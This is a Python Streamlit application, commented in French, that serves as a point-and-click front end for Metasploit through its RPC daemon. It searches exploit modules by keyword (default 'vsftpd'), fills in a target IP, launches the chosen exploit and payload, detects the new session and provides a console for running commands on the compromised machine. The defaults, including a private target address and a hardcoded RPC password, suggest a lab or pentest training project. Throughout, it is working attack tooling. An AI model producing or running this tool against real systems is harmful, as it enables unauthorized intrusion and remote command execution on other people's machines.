import streamlit as st
from pymetasploit3.msfrpc import MsfRpcClient
import time

# ---------------------------------------------------
# Utilitaires
# ---------------------------------------------------
def connect_rpc(password='sondos', server='127.0.0.1', port=55553, ssl=False):
    """Se connecter au démon msfrpcd"""
    return MsfRpcClient(password, server=server, port=port, ssl=ssl)

def execute_command(session, cmd, wait=1):
    """Exécute une commande sur une session Metasploit et récupère la sortie."""
    try:
        session.write(cmd + "\n")
        time.sleep(wait)
        return session.read()
    except Exception as e:
        return f"Erreur exécution commande: {e}"

def get_module_info(client, module_name):
    """Récupère module.info via RPC (si disponible)."""
    try:
        return client.call('module.info', ['exploit', module_name])
    except Exception as e:
        return {"error": str(e)}

# ---------------------------------------------------
# Fonction principale
# ---------------------------------------------------
def exploit_and_console():
    st.set_page_config(page_title="Metasploit Streamlit (RPC)", layout="wide")
    st.title("💥 Exploit + Console Metasploit (via msfrpcd)")

    # ---------------------------
    # Initialisation session_state
    # ---------------------------
    if "rpc_connected" not in st.session_state:
        st.session_state.rpc_connected = False
    if "chosen_module" not in st.session_state:
        st.session_state.chosen_module = None
    if "chosen_payload" not in st.session_state:
        st.session_state.chosen_payload = None
    if "exploit_launched" not in st.session_state:
        st.session_state.exploit_launched = False
    if "found_session" not in st.session_state:
        st.session_state.found_session = None
    if "console_history" not in st.session_state:
        st.session_state.console_history = []

    # ---------------------------
    # Sidebar : paramètres RPC / timeout
    # ---------------------------
    with st.sidebar:
        st.header("Paramètres RPC")
        rpc_pass = st.text_input("Mot de passe msfrpcd", value="sondos", type="password")
        rpc_host = st.text_input("RPC host", value="127.0.0.1")
        rpc_port = st.number_input("RPC port", value=55553, step=1)
        rpc_ssl = st.checkbox("Utiliser SSL", value=False)
        timeout_seconds = st.number_input("Timeout (s) pour attendre la session", min_value=1, value=20)
        poll_interval = st.number_input("Intervalle de polling (s)", min_value=0.1, value=1.0, step=0.1)

    # ---------------------------
    # Inputs principaux pour recherche d'exploit
    # ---------------------------
    rhost = st.text_input("🎯 Adresse IP de la cible (RHOST)", value="192.168.252.209")
    keyword = st.text_input("🔍 Mot-clé pour rechercher les exploits", value="vsftpd")

    # ---------------------------
    # Connexion RPC et recherche d'exploits
    # ---------------------------
    if st.button("🔎 Rechercher les exploits") or st.session_state.rpc_connected:
        try:
            client = connect_rpc(password=rpc_pass, server=rpc_host, port=int(rpc_port), ssl=rpc_ssl)
            st.session_state.rpc_connected = True
        except Exception as e:
            st.error(f"Impossible de se connecter à msfrpcd : {e}")
            st.stop()

        try:
            all_exploits = list(client.modules.exploits)
        except Exception as e:
            st.error(f"Erreur récupération modules : {e}")
            st.stop()

        matches = [name for name in all_exploits if keyword.lower() in name.lower()]
        if not matches:
            st.warning(f"Aucun exploit trouvé pour '{keyword}'.")
        else:
            st.success(f"{len(matches)} exploit(s) trouvé(s).")

            selected_index = 0
            if st.session_state.chosen_module in matches:
                selected_index = matches.index(st.session_state.chosen_module)

            st.session_state.chosen_module = st.selectbox(
                "Modules trouvés",
                options=matches,
                index=selected_index
            )

            # Affichage infos module
            info = get_module_info(client, st.session_state.chosen_module)
            if info.get("error"):
                st.warning(f"Impossible de récupérer module.info : {info['error']}")
            else:
                st.markdown("### Description du module")
                st.write(info.get("description", "N/A"))
                st.markdown("### Options")
                opts = info.get('options', {})
                if opts:
                    for opt, opt_info in opts.items():
                        req = "✅ requis" if opt_info.get('required') else "❎ optionnel"
                        default = opt_info.get('default')
                        st.write(f"- **{opt}** — {req} — default: {default} — {opt_info.get('desc','')}")

                # Lister payloads
                try:
                    tmp = client.modules.use('exploit', st.session_state.chosen_module)
                    payloads = tmp.payloads or []
                    if payloads:
                        st.write(f"Payloads disponibles : {len(payloads)}")
                        selected_payload_index = 0
                        if st.session_state.chosen_payload in payloads:
                            selected_payload_index = payloads.index(st.session_state.chosen_payload)
                        st.session_state.chosen_payload = st.selectbox(
                            "Choisir le payload",
                            options=payloads,
                            index=selected_payload_index
                        )
                except Exception as e:
                    st.warning(f"Impossible de lister les payloads : {e}")

    # ---------------------------
    # Lancer l'exploit et détecter nouvelle session
    # ---------------------------
    if st.button("🚀 Lancer l'exploit") and st.session_state.chosen_module:
        st.session_state.found_session = None  # Réinitialiser pour ne considérer que les nouvelles sessions
        try:
            client = connect_rpc(password=rpc_pass, server=rpc_host, port=int(rpc_port), ssl=rpc_ssl)
            exploit_module = client.modules.use('exploit', st.session_state.chosen_module)
            info = get_module_info(client, st.session_state.chosen_module)

            # Stocker les sessions existantes avant le lancement
            existing_sessions = set(client.sessions.list.keys())

            # Configurer options requises
            for opt, opt_info in info.get('options', {}).items():
                if opt_info.get('required'):
                    if opt.lower() in ("rhosts", "rhost"):
                        exploit_module[opt] = rhost
                    elif opt_info.get('default') is not None:
                        exploit_module[opt] = opt_info['default']

            # Charger payload si sélectionné
            payload_module = None
            if st.session_state.chosen_payload:
                try:
                    payload_module = client.modules.use('payload', st.session_state.chosen_payload)
                except Exception as e:
                    st.warning(f"Impossible de charger le payload choisi : {e}")

            exploit_module.execute(payload=payload_module) if payload_module else exploit_module.execute()
            st.info(f"[i] Exploit '{st.session_state.chosen_module}' lancé, en attente d'une nouvelle session...")

            # Polling pour détecter uniquement les nouvelles sessions
            start = time.time()
            session_created = False
            while time.time() - start < float(timeout_seconds):
                current_sessions = set(client.sessions.list.keys())
                new_sessions = current_sessions - existing_sessions
                if new_sessions:
                    session_id = list(new_sessions)[0]
                    st.session_state.found_session = client.sessions.session(session_id)
                    st.success(f"Session ouverte : {session_id}")
                    session_created = True
                    break
                time.sleep(float(poll_interval))

            if not session_created:
                st.warning("Aucune session RPC créée par cet exploit.")

            st.session_state.exploit_launched = True

        except Exception as e:
            st.error(f"Erreur lancement exploit : {e}")
            st.stop()

    # ---------------------------
    # Console uniquement si nouvelle session ouverte
    # ---------------------------
    if st.session_state.found_session:
        cmd = st.text_input("⌨️ Commande à exécuter", value="whoami")
        if st.button("📡 Exécuter la commande") and cmd:
            out = execute_command(st.session_state.found_session, cmd)
            st.session_state.console_history.append(f"> {cmd}")
            st.session_state.console_history.append(out)

        st.text_area("🖥️ Console Metasploit (session)", "\n".join(st.session_state.console_history), height=500)

# ---------------------------------------------------
# Entrée principale
# ---------------------------------------------------
if __name__ == "__main__":
    exploit_and_console()
